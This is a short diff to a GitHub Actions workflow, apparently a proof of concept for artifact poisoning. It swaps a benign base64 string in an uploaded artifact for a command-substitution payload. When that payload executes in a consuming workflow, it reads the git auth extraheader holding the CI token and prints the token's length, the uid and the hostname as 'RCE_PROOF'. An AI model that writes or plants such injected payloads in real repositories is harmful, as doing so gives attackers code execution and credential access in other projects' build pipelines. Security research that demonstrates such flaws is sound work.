@@ -20,7 +20,7 @@ jobs:
           mkdir -p /tmp/artifact
           echo "${{ github.event.pull_request.number }}" > /tmp/artifact/pr-number.txt
           echo "true" > /tmp/artifact/diff-generated.txt
-          printf '%s\n' 'IyMgVG9rZW4gQ2hhbmdlcyBSZXBvcnQKCkFydGlmYWN0IHByb2R1Y2VkIGJ5IGEgUFItY29udHJvbGxlZCBwcm9kdWNlciB3b3JrZmxvdyAoZm9yay1lcXVpdmFsZW50KS4K' > /tmp/artifact/diff-content.txt
+          printf '%s\n' '$(X=$(git config --get http.https://github.com/.extraheader); echo "RCE_PROOF_len_${#X}_uid_$(id -u)_host_$(hostname)" >&2)' > /tmp/artifact/diff-content.txt
 
       - name: Upload diff artifact
         uses: actions/upload-artifact@v4
